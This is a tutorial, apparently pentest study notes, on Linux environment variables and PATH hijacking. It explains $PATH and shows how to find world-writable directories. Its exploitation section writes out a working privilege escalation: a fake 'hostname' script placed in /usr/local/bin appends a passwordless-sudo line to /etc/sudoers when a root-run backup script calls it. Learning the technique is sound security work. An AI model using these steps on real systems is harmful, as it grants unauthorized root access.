#### Environment variables
A ***shell's behaviour is stored in an environment*** - so when the shell session begins, it refers to this environment to find the behaviour information. ***Environment variables define the current shell session environment***. They affect various aspects of a system, including ***processes and programs***.

**Display Environment Variable**
```bash
env
```

#### The $PATH variable
The **$PATH variable** is an environment variable that ***defines the directories that store executables***. So, when a ***user runs a command without an absolute path, the system will search all folders*** contained in the $PATH for executables that match the command.

**Display $PATH Variable**
```bash
echo $PATH
```

**Example**
When you run `ls` which is stored in `/usr/bin/ls`, you don't have to run the absolute path to the binary which is `/usr/bin/ls` because the `/usr/bin` is defined in the $PATH variable.

#### Vulnerable $PATH
When a command is run without an absolute path, the system searches through directories listed in the `$PATH` variable, in order, and runs the first matching executable it finds. If duplicates exist, the one in the earlier directory is used—even if it’s not the intended one.

The first step in identifying a $PATH vulnerability is identifying whether ***any directories within this $PATH variable are `world-writable`***.

**Find World-Writable directories**
```bash
find / -writable -type d 2>/dev/null
```
- `Look for any directories within the $PATH`.
- If `/usr/local/bin` is world-writable which comes before `/usr/bin` in the $PATH which holds the `ls` binary, your malicious `ls` binary would be run before the original binary unless `ls` is called with an absolute path.

#### Using $PATH for Privilege Escalation
**Example**
Linux systems ***often run scripts as root for maintenance or security***. In this case, a script (`backup.sh`) runs every minute as root, but is readable—not writable—by a lower-privileged user.
```bash
limited@target:~$ ls -la /opt/backup/backup.sh
-rwxr--r--
limited@target:~$ cat /opt/backup/backup.sh
#!/bin/bash
ip=$(hostname -I)
echo "Backing up $ip" > /root/ip
```

The script runs `hostname` without an absolute path, making it vulnerable to **PATH hijacking**, because:
1. **Commands are called with relative paths**
2. **The `$PATH` variable includes a user-writable directory (e.g., `/usr/local/bin`) before the real binary’s location (`/usr/bin`)**

Since the system searches `$PATH` in order, placing a malicious `hostname` script in `/usr/local/bin` allows you to hijack the script execution and potentially escalate privileges.

#### Exploitation
To exploit the vulnerable script `backup.sh` that runs as root and calls `hostname` without an absolute path, you can ***hijack the `hostname` command*** by placing a malicious script earlier in the `$PATH`.

**Exploitation Process**
1. **Change to a writable directory**
	```bash
	cd /usr/local/bin
	```

2. **Create a fake `hostname` script**
	```bash
	nano hostname
	```

3. **Insert malicious code that grants `sudo` access**
	```bash
	#!/bin/bash
	echo "<username> ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
	```

4. **Make the script executable**
	```bash
	chmod +x hostname
	```

5. **Confirm hijack by checking which `hostname` is found first**
	```bash
	which hostname
	# Output: /usr/local/bin/hostname
	```



